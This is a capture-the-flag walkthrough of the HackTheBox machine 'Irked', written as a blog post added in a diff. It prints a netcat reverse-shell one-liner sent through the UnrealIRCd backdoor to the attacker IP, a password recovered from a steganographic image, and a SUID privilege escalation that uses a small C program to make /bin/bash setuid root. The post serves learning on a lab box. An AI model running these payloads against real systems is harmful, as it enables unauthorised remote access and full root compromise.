@@ -1,0 +1,146 @@
+---
+layout: post
+title:  "HackTheBox - Irked"
+date:   2021-08-12 01:58:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp    open  http    syn-ack Apache httpd 2.4.10 ((Debian))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          32804/udp   status
+|   100024  1          38238/tcp   status
+|   100024  1          38944/tcp6  status
+|_  100024  1          50059/udp6  status
+6697/tcp  open  irc     syn-ack UnrealIRCd
+8067/tcp  open  irc     syn-ack UnrealIRCd
+38238/tcp open  status  syn-ack 1 (RPC #100024)
+65534/tcp open  irc     syn-ack UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+After searching a bit we find a link from hacktricks where we see that we can connect via netcat with the port and send our payload:
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc irked.htb 6697
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+AB; cd /tmp; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.34 1337 >/tmp/f
+```
+And we get our reverse shell in our listener:
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.117] 41943
+bash: cannot set terminal process group (642): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+User.txt is in /home/djmardov/Documents but we do not have permission to view its contents.However there is another file in the directory:
+```s
+ircd@irked:/home/djmardov/Documents$ ls -la
+ls -la
+total 16
+drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
+ircd@irked:/home/djmardov/Documents$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+Since we have come across only one image while enumerating port 80 we download that image and run steghide to get the password:
+```
+Kab6h+m+bbp2J:HG
+```
+We cannot escalate to djmardov in our current shell so we ssh into djmardov.Searching for SUID binaried we come across this uncommon one called viewuser:
+```s
+djmardov@irked:/tmp$ find / -perm /4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/bash
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+```
+After searching a bit we get a direct way to escalate our privileges in this [link](https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/).So we try this exploit:
+```s
+djmardov@irked:~/Documents$ cd /tmp
+djmardov@irked:/tmp$ ls
+f
+socat
+systemd-private-1601aad9b66a4362bb51e1595b03a2ea-colord.service-6Agm8z
+systemd-private-1601aad9b66a4362bb51e1595b03a2ea-cups.service-Ngcrdv
+systemd-private-1601aad9b66a4362bb51e1595b03a2ea-rtkit-daemon.service-4VOX6P
+vmware-root
+djmardov@irked:/tmp$ touch listusers.c
+djmardov@irked:/tmp$ nano listusers.c 
+djmardov@irked:/tmp$ cat listusers.c
+int main(int argc, char **argv) {
+	setuid(0);
+	system("chmod +s /bin/bash");
+	return 0;
+}
+djmardov@irked:/tmp$ gcc listusers.c -o listusers
+djmardov@irked:/tmp$ ls -ltr
+total 396
+-rwx------ 1 ircd     ircd     375176 Jun 25 13:42 socat
+drwx------ 2 root     root       4096 Aug 11 08:29 vmware-root
+drwx------ 3 root     root       4096 Aug 11 08:29 systemd-private-1601aad9b66a4362bb51e1595b03a2ea-colord.service-6Agm8z
+drwx------ 3 root     root       4096 Aug 11 08:29 systemd-private-1601aad9b66a4362bb51e1595b03a2ea-rtkit-daemon.service-4VOX6P
+drwx------ 3 root     root       4096 Aug 11 08:34 systemd-private-1601aad9b66a4362bb51e1595b03a2ea-cups.service-Ngcrdv
+prw------- 1 ircd     ircd          0 Aug 11 15:10 f
+-rw-r--r-- 1 djmardov djmardov     90 Aug 11 15:18 listusers.c
+-rwxr-xr-x 1 djmardov djmardov   5048 Aug 11 15:18 listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2021-08-11 08:29 (:0)
+djmardov pts/0        2021-08-11 15:11 (10.10.14.34)
+```
+After this we run "bash -p" to get root shell:
+```s
+djmardov@irked:/tmp$ bash -p
+bash-4.3# whoami
+root
+bash-4.3# cd /root
+bash-4.3# cat root.txt
+```
+Root flag is in /root/root.txt
